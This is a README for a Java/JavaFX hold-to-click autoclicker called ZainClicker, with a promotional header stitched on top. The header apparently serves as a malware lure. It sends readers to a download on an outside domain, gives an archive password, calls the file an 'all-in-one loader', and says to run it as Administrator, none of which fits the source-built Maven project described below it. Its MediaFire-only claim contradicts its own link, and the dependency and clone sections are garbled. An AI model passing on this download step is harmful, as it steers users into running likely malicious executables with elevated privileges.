<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# ZainClicker

A lightweight desktop autoclicker built with **Java** and **JavaFX**. It clicks at a randomised speed within a range you choose, but only while you're holding the left mouse button, so you stay in control the whole time. A global middle-click shortcut toggles it on and off from any window.


## Features

- **Hold-to-click.** Clicks only fire while you're physically holding the left mouse button, and stop the moment you let go.
- **Randomised CPS.** Set a minimum and maximum clicks per second. Each click picks a fresh random speed within that range, giving a natural, uneven rhythm rather than a robotic fixed interval.
- **Global toggle.** Middle-click anywhere on your screen to switch the clicker on or off, even when the ZainClicker window isn't focused.
- **Live status indicator.** A clear green **● ON** / red **● OFF** label shows the current state at a glance.
- **Input validation.** The CPS fields only accept whole numbers, so invalid values can't be entered.
- **Dark theme.** A clean, compact interface styled with JavaFX CSS.

---

## How it works

| Part | What it does |
|---|---|
| **JavaFX** | Builds the window, controls and dark theme (styled via `style.css`). |
| **JNativeHook** | Listens to the mouse system-wide, so the middle-click toggle and the "left button held" check work in any app. |
| **`java.awt.Robot`** | Sends the actual left clicks. |
| **Background thread** | Runs the click loop separately from the GUI, so the window never freezes. |

The program uses JNativeHook to watch for real mouse button presses. Because the clicks it generates itself also pass through the system, it keeps a count of the "fake" events it's about to create and ignores them. This means only *your* presses and releases decide whether the button is being held.

---

## Requirements

- **JDK 17 or newer** (JavaFX 21 requires Java 17+)
- **Maven** is not required separately; the included Maven wrapper (`mvnw`) downloads it for you
- Windows, macOS or Linux

### Dependencies

Maven handles these automatically:

| Library | Version |
|---|---|
## Getting started

### Clone the repository

```bash
### Run with IntelliJ IDEA

1. Open the project folder in IntelliJ IDEA.
2. Wait for Maven to finish downloading dependencies.
3. Open `src/main/java/zain/zainclicker/Launcher.java`.
4. Click the green ▶ next to `public class Launcher` and choose **Run**.

> **Note:** Always start the app from `Launcher`, not `ZainClicker`. The project doesn't use Java modules, and JavaFX requires the entry point to be a separate class from the one that extends `Application`.

### Run with the Maven wrapper

```bash
./mvnw clean javafx:run
```

On Windows Command Prompt or PowerShell, use `mvnw.cmd clean javafx:run` instead.

---

## Usage

1. Enter a **Min CPS** and a **Max CPS** (for example, 8 and 12).
2. **Middle-click** anywhere, or tick **Enable**, to switch the clicker on. The status changes to **● ON**.
3. **Hold the left mouse button** to start clicking. Release it to stop.
4. **Middle-click** again to switch the clicker off.

### Controls

| Input | Action |
|---|---|
| Middle mouse button | Toggle the clicker on / off (works globally) |
| Hold left mouse button | Fire clicks while enabled |
| Release left mouse button | Stop clicking |

### Tips

- If you enter the minimum and maximum the wrong way round, ZainClicker swaps them automatically.
- Leaving both fields empty, or entering 0, means no clicks will fire.
- Move your mouse off the ZainClicker window before enabling it, so it doesn't click its own controls.

---

## Platform notes

- **macOS:** global mouse listening is blocked by default. Go to **System Settings → Privacy & Security → Accessibility** and allow IntelliJ IDEA (or Java) before running.
- **All platforms:** you may see a warning saying *"Unsupported JavaFX configuration: classes were loaded from 'unnamed module'"*. This is expected for non-modular JavaFX projects and is harmless.

---

## Project structure

```
ZainClicker/
├── pom.xml
└── src/main/
    ├── java/zain/zainclicker/
    │   ├── Launcher.java       // Entry point, starts the JavaFX app
    │   └── ZainClicker.java    // GUI, global mouse hook and click loop
    └── resources/zain/zainclicker/
        └── style.css           // Dark theme styling
```

---

## Disclaimer

This project was built as a Java and JavaFX learning exercise. Many online games and multiplayer servers prohibit autoclickers and other input automation, and using one may get your account banned. Check the rules of any game or service before using it there. Use responsibly and at your own risk.

---


---

MIT License

Copyright (c) 2026 ZainnDev

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
